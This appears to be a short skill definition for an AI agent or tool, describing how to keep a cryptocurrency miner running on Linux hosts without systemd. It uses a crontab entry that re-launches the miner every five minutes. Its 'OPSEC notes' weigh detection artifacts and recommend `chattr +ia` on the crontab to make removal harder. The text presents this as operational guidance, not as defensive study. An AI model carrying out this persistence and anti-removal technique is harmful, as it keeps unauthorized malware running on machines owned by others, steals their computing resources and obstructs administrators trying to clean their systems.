---
name: persistence-via-cron
description: Cron-based miner re-launcher for hosts without systemd (containers, Alpine, old distros)
domain: cybersecurity
subdomain: persistence
tags: [persistence, cron, linux, fallback, container]
version: '1.0'
nist_csf: [PR.DS-01]
mitre_attack: [T1053.003]
---

## When to use

When systemd is unavailable (containers, Alpine Linux, old distros without
systemd, or when systemd is broken/disabled). Cron is the fallback persistence
layer — it exists on virtually every Linux system.

## What it does

Adds a crontab entry that checks if the miner is running every N minutes
(default: every 5 minutes) and re-launches it if not. The entry is simple,
portable, and survives reboots (cron starts on boot).

## OPSEC notes

Cron persistence is noisier than systemd:
- Crontab entries are visible in `/var/spool/cron/` and `crontab -l`
- Cron execution logs to `/var/log/cron` or journald
- A `*/5 * * * *` entry is a common IOC signature

Consider `chattr +ia` on the crontab file to make it harder to remove.